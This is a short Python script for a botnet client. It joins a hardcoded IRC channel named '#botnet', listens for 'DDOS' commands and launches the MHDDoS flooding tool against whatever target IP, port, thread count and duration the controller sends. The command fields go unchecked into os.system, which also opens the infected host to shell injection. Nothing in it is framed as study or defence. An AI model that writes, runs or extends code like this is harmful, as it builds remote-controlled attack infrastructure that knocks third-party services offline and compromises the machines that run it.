#!/usr/bin/env python3

import os
import socket
import sys

DDOS_SCRIPT_PATH = "MHDDoS/start.py"

local_ip = socket.gethostbyname(socket.gethostname())

server = "142.1.46.66"  # TODO: Dynamically set this from args.
port = 6667
channel = "#botnet"

nick = "".join(local_ip.split("."))

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def initiate_ddos(method, target_ip, target_port, threads, duration):
    os.system(f"python3 {DDOS_SCRIPT_PATH} {method} {target_ip}:{target_port} {threads} {duration}")


if __name__ == "__main__":
    irc.connect((server, port))
    irc.send(f"NICK {nick}\r\n".encode())
    irc.send(f"USER {nick} {nick} {nick} :{nick}\r\n".encode())
    irc.send(f"JOIN {channel}\r\n".encode())

    while True:
        msg = irc.recv(1024).decode()
        print(msg)

        if "PING" in msg:
            irc.send(f"PONG {nick}\r\n".encode())

        if "DDOS" in msg:
            method, target_ip, target_port, threads, duration = msg.rstrip().split(":DDOS ")[1].split(" ")
            initiate_ddos(method, target_ip, target_port, threads, duration)
